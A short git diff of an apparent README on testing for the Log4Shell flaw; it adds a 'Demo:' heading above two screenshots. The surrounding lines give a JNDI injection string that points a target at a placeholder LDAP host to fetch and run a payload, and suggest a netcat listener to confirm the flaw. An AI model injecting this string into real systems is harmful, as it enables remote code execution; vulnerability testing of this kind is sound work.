@@ -27,6 +27,8 @@ String to inject: ```${jndi:ldap://<ip>:<port>/<name-of-the-payload-to-execute>}
 First, you can start netcat listener and try to trigger it. 
 If the netcat listener is trigger, then you know that the application is vulnerable. 
 
+Demo:
+
 ![image](https://user-images.githubusercontent.com/76106120/147582133-b8466261-e23b-4b8f-b997-9541877b06e9.png)
 ![image](https://user-images.githubusercontent.com/76106120/147582157-c4408876-3af2-42fe-a5ea-8866a0913886.png)
 
